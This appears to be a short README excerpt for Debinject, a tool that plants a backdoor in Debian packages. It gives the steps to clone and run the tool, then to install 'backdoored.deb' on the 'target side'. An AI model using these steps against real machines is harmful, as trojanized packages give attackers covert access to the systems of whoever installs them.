```
git clone https://github.com/UndeadSec/Debinject.git
```

### RUNNING
```
cd Debinject
```

```
python debinject.py
```

### RUN ON TARGET SIDE

```
chmod 755 backdoored.deb
```

```
dpkg -i backdoored.deb
```
